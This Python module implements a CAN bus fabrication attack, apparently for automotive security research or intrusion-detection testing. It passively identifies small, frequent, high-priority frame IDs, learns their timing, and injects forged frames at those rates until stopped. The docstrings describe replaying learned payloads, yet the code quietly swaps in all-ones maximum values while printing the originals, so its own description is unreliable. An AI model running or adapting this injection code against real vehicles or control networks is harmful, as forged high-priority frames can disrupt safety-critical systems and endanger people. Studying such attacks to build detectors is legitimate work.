"""Fake data fabrication (fabrication) attack: learn and replay CAN traffic.

This attack passively observes legitimate CAN messages on the bus to identify
target control IDs. It then learns their transmission periods and representative
payloads, and replays them at their original frequencies to masquerade as
legitimate traffic. The implementation follows a learn-then-replay approach
inspired by common CAN fabrication attacks.
"""
from collections import defaultdict
from statistics import median
import time

import can

DEFAULT_OBSERVE_TIME_IDENTIFY = 10.0
DEFAULT_OBSERVE_TIME_PRIORITY = 5.0
DEFAULT_OBSERVE_TIME_LEARN = 5.0
DEFAULT_MAX_DLC = 4
DEFAULT_MIN_FREQ_HZ = 8.0
DEFAULT_TOP_N = 10
DEFAULT_DROP_IDS = (0x611, 0x612, 0x613)


def identify_signals(bus, observe_time=DEFAULT_OBSERVE_TIME_IDENTIFY):
    """
    Observe traffic and flag IDs whose payload bytes change meaningfully.

    Parameters
    ----------
    bus : can.interface.Bus
        CAN bus instance.
    observe_time : float, optional
        Duration to observe traffic for.

    Returns
    -------
    None
        Prints a report of detected signals.
    """
    stats = defaultdict(lambda: {
        "count": 0,
        "last_ts": None,
        "periods": [],
        "byte_min": [255] * 8,
        "byte_max": [0] * 8,
        "byte_changes": [0] * 8,
        "last_bytes": None,
    })

    start = time.time()
    while time.time() - start < observe_time:
        msg = bus.recv(timeout=0.5)
        if msg is None or msg.is_error_frame:
            continue

        cid = msg.arbitration_id
        ts = msg.timestamp
        data = bytes(msg.data)
        s = stats[cid]
        s["count"] += 1

        if s["last_ts"] is not None:
            s["periods"].append(ts - s["last_ts"])
        s["last_ts"] = ts

        if s["last_bytes"] is not None:
            for i, b in enumerate(data):
                if b != s["last_bytes"][i]:
                    s["byte_changes"][i] += 1
                s["byte_min"][i] = min(s["byte_min"][i], b)
                s["byte_max"][i] = max(s["byte_max"][i], b)
        s["last_bytes"] = data

    print(f"{'ID':>8} {'count':>7} {'period(ms)':>11} {'changing bytes (range)'}")
    for cid, s in sorted(stats.items(), key=lambda x: -x[1]["count"]):
        if not s["periods"]:
            continue
        p = median(s["periods"]) * 1000
        changing = []
        for i in range(8):
            if s["byte_max"][i] > s["byte_min"][i]:
                changing.append(
                    f"b{i}:{s['byte_min'][i]:02X}-{s['byte_max'][i]:02X}"
                    f"({s['byte_changes'][i]})"
                )
        print(f"0x{cid:06X} {s['count']:7d} {p:11.2f} {' '.join(changing)}")


def identify_priority_packets(
    bus,
    observe_time=DEFAULT_OBSERVE_TIME_PRIORITY,
    max_dlc=DEFAULT_MAX_DLC,
    min_frequency_hz=DEFAULT_MIN_FREQ_HZ,
    top_n=DEFAULT_TOP_N,
):
    """
    Return a ranked shortlist of CAN IDs that are small, fast, high-priority.

    Parameters
    ----------
    bus : can.interface.Bus
        CAN bus instance.
    observe_time : float, optional
        Duration to observe traffic for.
    max_dlc : int, optional
        Maximum DLC to consider.
    min_frequency_hz : float, optional
        Minimum frequency threshold.
    top_n : int, optional
        Number of top candidates to return.

    Returns
    -------
    list[int]
        List of candidate CAN IDs ranked by score.
    """
    stats = defaultdict(lambda: {
        "count": 0, "last_ts": None, "periods": [], "dlc": None,
    })

    start = time.time()
    while time.time() - start < observe_time:
        msg = bus.recv(timeout=0.5)
        if msg is None or msg.is_error_frame or msg.is_remote_frame:
            continue
        cid = msg.arbitration_id
        s = stats[cid]
        s["count"] += 1
        s["dlc"] = msg.dlc
        if s["last_ts"] is not None:
            s["periods"].append(msg.timestamp - s["last_ts"])
        s["last_ts"] = msg.timestamp

    candidates = {}
    for cid, s in stats.items():
        if s["dlc"] is None or s["dlc"] > max_dlc:
            continue
        if len(s["periods"]) < 3:
            continue
        period = median(s["periods"])
        if period <= 0:
            continue
        freq = 1.0 / period
        if freq < min_frequency_hz:
            continue
        candidates[cid] = {
            "can_id": cid, "dlc": s["dlc"], "count": s["count"],
            "period": period, "frequency": freq,
        }

    if not candidates:
        print("No candidates matched size/frequency filters.")
        return []

    max_count = max(c["count"] for c in candidates.values())
    results = []
    for cid, c in candidates.items():
        dlc_score = (8 - c["dlc"]) / 8.0
        freq_score = c["count"] / max_count
        prio_score = 1.0 - (cid / 0x7FF)
        score = 0.3 * dlc_score + 0.4 * freq_score + 0.3 * prio_score
        c["score"] = score
        results.append(c)

    results.sort(key=lambda x: x["score"], reverse=True)
    top = results[:top_n]

    print(f"\nTop {len(top)} candidate IDs "
          f"(DLC<={max_dlc}, freq>={min_frequency_hz}Hz):")
    print(f"{'ID':>8} {'DLC':>4} {'count':>7} "
          f"{'period(ms)':>11} {'freq(Hz)':>9} {'score':>6}")
    for r in top:
        print(f"0x{r['can_id']:05X} {r['dlc']:4d} {r['count']:7d} "
              f"{r['period'] * 1000:11.2f} {r['frequency']:9.1f} "
              f"{r['score']:6.3f}")

    return [r["can_id"] for r in top]

def max_value(data: bytes) -> bytes:
    value = int.from_bytes(data, byteorder="little")
    max_val = (1 << value.bit_length()) - 1
    return max_val.to_bytes(len(data), byteorder="little")


def learn_targets(bus, target_ids, observe_time=DEFAULT_OBSERVE_TIME_LEARN):
    """
    Learn median period and a representative payload for each target ID.

    Parameters
    ----------
    bus : can.interface.Bus
        CAN bus instance.
    target_ids : iterable[int]
        Target arbitration IDs to observe.
    observe_time : float, optional
        Duration to observe traffic for.

    Returns
    -------
    dict
        Mapping {can_id: {'period': float_seconds, 'payload': bytes}}
    """
    periods = defaultdict(list)
    last_payload = {}
    last_ts = {}

    start = time.time()
    while time.time() - start < observe_time:
        msg = bus.recv(timeout=0.5)
        if msg is None or msg.arbitration_id not in target_ids:
            continue
        cid = msg.arbitration_id
        if cid in last_ts:
            periods[cid].append(msg.timestamp - last_ts[cid])
        last_ts[cid] = msg.timestamp
        last_payload[cid] = bytes(msg.data)

    result = {}
    for cid, ps in periods.items():
        if len(ps) >= 3:
            result[cid] = {
                "period": median(ps),
                "payload": max_value(last_payload[cid]),
            }
            print(f"0x{cid:X}: median period = {median(ps) * 1000:.2f} ms "
                  f"({1 / median(ps):.1f} Hz), "
                  f"payload = {last_payload[cid].hex(' ').upper()}")
    return result


def replay_periodic(bus, targets, progress=None):
    """
    Replay learned messages periodically at their original frequencies.

    Parameters
    ----------
    bus : can.interface.Bus
        CAN bus instance.
    targets : dict
        Mapping {can_id: {'period': float_seconds, 'payload': bytes}}
    progress : callable, optional
        Optional callable ``(sent, rate, msg)`` invoked after sending.

    Runs continuously until interrupted by KeyboardInterrupt.
    """
    tasks = []
    for cid, info in targets.items():
        msg = can.Message(
            arbitration_id=cid,
            data=info["payload"],
            is_extended_id=False,
        )
        task = bus.send_periodic(msg, info["period"])
        tasks.append((cid, task, msg))
        print(f"Replaying 0x{cid:X} every {info['period'] * 1000:.2f} ms, Payload: {info['payload'].hex(' ').upper()}")

    sent = 0
    start = time.monotonic()
    try:
        while True:
            time.sleep(1.0)
            sent += len(tasks)
            if progress is not None:
                elapsed = time.monotonic() - start or 1e-9
                for _, _, msg in tasks:
                    progress(sent, sent / elapsed, msg)
                    break
    except KeyboardInterrupt:
        print("\nReplay stopped by user.")
    finally:
        for _, task, _ in tasks:
            try:
                task.stop()
            except Exception:
                pass
        print("Periodic tasks stopped.")


def fake_data_fabrication_func(
    bus,
    observe_identify=DEFAULT_OBSERVE_TIME_IDENTIFY,
    observe_priority=DEFAULT_OBSERVE_TIME_PRIORITY,
    observe_learn=DEFAULT_OBSERVE_TIME_LEARN,
    max_dlc=DEFAULT_MAX_DLC,
    min_freq_hz=DEFAULT_MIN_FREQ_HZ,
    top_n=DEFAULT_TOP_N,
    drop_ids=DEFAULT_DROP_IDS,
    progress=None,
):
    """
    Execute the fake data fabrication attack.

    Learns target IDs from bus traffic, learns their periods and payloads,
    optionally drops specified IDs, then replays learned messages periodically
    until interrupted.

    Parameters
    ----------
    bus : can.interface.Bus
        CAN bus instance.
    observe_identify : float, optional
        Observation time for signal identification.
    observe_priority : float, optional
        Observation time for priority packet identification.
    observe_learn : float, optional
        Observation time for learning periods/payloads.
    max_dlc : int, optional
        Maximum DLC for candidate filtering.
    min_freq_hz : float, optional
        Minimum frequency for candidate filtering.
    top_n : int, optional
        Number of top candidates to select.
    drop_ids : tuple[int], optional
        IDs to drop from learned targets.
    progress : callable, optional
        Optional progress callback for status updates during replay.
    """
    print("=== Step 1: Auto-identify target IDs ===")
    target_ids = identify_priority_packets(
        bus,
        observe_time=observe_priority,
        max_dlc=max_dlc,
        min_frequency_hz=min_freq_hz,
        top_n=top_n,
    )
    if not target_ids:
        print("No targets identified — aborting.")
        try:
            bus.shutdown()
        except Exception:
            pass
        return

    print(f"\nSelected IDs: {[hex(i) for i in target_ids]}")

    print("\n=== Step 2: Learn periods & payloads ===")
    targets = learn_targets(bus, set(target_ids), observe_time=observe_learn)
    if not targets:
        print("No target IDs observed during learning — aborting.")
        try:
            bus.shutdown()
        except Exception:
            pass
        return

    for did in drop_ids:
        try:
            targets.pop(int(did))
        except (KeyError, ValueError, TypeError):
            pass

    print("\n=== Step 3: Replay at original frequency ===")
    replay_periodic(bus, targets, progress=progress)
    try:
        bus.shutdown()
    except Exception:
        pass
